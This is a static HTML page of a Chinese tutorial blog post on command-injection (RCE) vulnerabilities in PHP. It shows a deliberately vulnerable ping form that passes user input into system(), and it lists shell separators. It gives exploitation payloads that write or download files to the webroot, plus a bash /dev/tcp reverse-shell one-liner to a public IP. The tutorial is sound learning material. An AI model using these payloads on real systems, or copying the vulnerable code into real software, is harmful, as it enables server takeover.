@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>浅谈命令执行漏洞——RCE | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。 一些WEB程序，比如Zabbix管理系统，会存在对相关服务器进行命令行输入和功能点，这类功能点很有可能存在命令执行漏洞，攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈命令执行漏洞——RCE">
+<meta property="og:url" content="http://yoursite.com/2020/05/30/rce/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。 一些WEB程序，比如Zabbix管理系统，会存在对相关服务器进行命令行输入和功能点，这类功能点很有可能存在命令执行漏洞，攻击">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-30T02:30:40.000Z">
+<meta property="article:modified_time" content="2020-05-30T13:24:08.239Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/05/30/rce/" class="article-date">
+  <time datetime="2020-05-30T02:30:40.000Z" itemprop="datePublished">2020-05-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      浅谈命令执行漏洞——RCE
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。</p>
+<p>一些WEB程序，比如Zabbix管理系统，会存在对相关服务器进行命令行输入和功能点，这类功能点很有可能存在命令执行漏洞，攻击者可以通过这种功能点反弹shell，获得服务器权限。</p>
+<h1 id="命令执行漏洞介绍"><a href="#命令执行漏洞介绍" class="headerlink" title="命令执行漏洞介绍"></a>命令执行漏洞介绍</h1><h2 id="命令执行漏洞的原理"><a href="#命令执行漏洞的原理" class="headerlink" title="命令执行漏洞的原理"></a>命令执行漏洞的原理</h2><p>WEB程序在调用函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</p>
+<h2 id="PHP下命令执行相关函数"><a href="#PHP下命令执行相关函数" class="headerlink" title="PHP下命令执行相关函数"></a>PHP下命令执行相关函数</h2><ul>
+<li>system()</li>
+<li>exec()</li>
+<li>shell_exec()</li>
+<li>passthru()</li>
+<li>popen()</li>
+<li>proc_popen()</li>
+</ul>
+<h2 id="命令执行漏洞的危害"><a href="#命令执行漏洞的危害" class="headerlink" title="命令执行漏洞的危害"></a>命令执行漏洞的危害</h2><ul>
+<li>执行系统命令</li>
+<li>反弹shell，取得服务器权限</li>
+<li>写入危害文件</li>
+</ul>
+<h1 id="命令执行漏洞复现"><a href="#命令执行漏洞复现" class="headerlink" title="命令执行漏洞复现"></a>命令执行漏洞复现</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;Here, please input the IP address!&lt;/p&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;input class=&quot;ipadd&quot; type=&quot;text&quot; name=&quot;ipaddress&quot; /&gt;</span><br><span class="line">        &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ping&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;ipaddress&#x27;</span>] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment"># code...</span></span><br><span class="line">        $ip = $_POST[<span class="string">&#x27;ipaddress&#x27;</span>];</span><br><span class="line">        $cmd = system(<span class="string">&quot;ping -c 4 $ip&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="命令执行漏洞之windows下利用"><a href="#命令执行漏洞之windows下利用" class="headerlink" title="命令执行漏洞之windows下利用"></a>命令执行漏洞之windows下利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;：&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;：&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|：直接执行后面的语句</span><br><span class="line">||：前面出错执行后面的</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="命令执行漏洞之Linux下利用"><a href="#命令执行漏洞之Linux下利用" class="headerlink" title="命令执行漏洞之Linux下利用"></a>命令执行漏洞之Linux下利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;：前面的执行完毕后执行后面的</span><br><span class="line">|：|是管道符，显示后面的执行结果</span><br><span class="line">||：||当前面的执行出错时执行后面的</span><br><span class="line">&amp;：无论前面语句真假后面的语句都会执行</span><br><span class="line">&amp;&amp;：只有前边的语句为真，才会执行后面的</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="命令执行漏洞利用思路"><a href="#命令执行漏洞利用思路" class="headerlink" title="命令执行漏洞利用思路"></a>命令执行漏洞利用思路</h1><ol>
+<li>如果有写权限的话，可以执行pwd得到绝对路径，然后可以写文件：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">• ?cmd&#x3D;echo&quot;&lt;?php phpinfo()?&gt;&quot; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php</span><br><span class="line">• ?cmd&#x3D;wget -O &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php http:&#x2F;&#x2F;www.xx.com&#x2F;phpinfo.txt</span><br><span class="line">• ?cmd&#x3D;curl http:&#x2F;&#x2F;www.xx.com&#x2F;phpinfo.txt &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;info.php</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>反弹shell：公网服务器执行 nc –lvv 8888</li>
+<li>目标服务器上执行：?cmd= bash -i &gt;&amp; /dev/tcp/211.149.191.5/9999 0&gt;&amp;1</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/05/30/rce/" data-id="ckdpdcy5x0009ok9r1mff2a0g" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag">web漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/06/01/ssrf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          由BWAPP学习SSRF
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/05/27/xxe/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">浅谈XXE漏洞(一)——有回显的XXE漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/">实战</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A1%B5%E9%9D%A2%E6%B5%8B%E8%AF%95/">页面测试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E9%9D%B6%E5%9C%BA/" rel="tag">WEB靶场</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/" rel="tag">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/window%E5%85%A5%E4%BE%B5/" rel="tag">window入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B6%E4%BB%96/" rel="tag">其他</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%A1%B5%E9%9D%A2%E6%B5%8B%E8%AF%95/" rel="tag">页面测试</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/WEB%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">WEB靶场</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/web%E6%BC%8F%E6%B4%9E/" style="font-size: 20px;">web漏洞</a> <a href="/tags/window%E5%85%A5%E4%BE%B5/" style="font-size: 10px;">window入侵</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 15px;">信息收集</a> <a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 10px;">其他</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a> <a href="/tags/%E9%A1%B5%E9%9D%A2%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">页面测试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/08/05/Pentester/">Pentester靶场学习writup</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/28/information-1/">信息收集脑图</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/window-ruqin/">window入侵试验</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/14/information/">信息收集笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/03/sql-test/">记录一次最基本的SQL注入实战</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
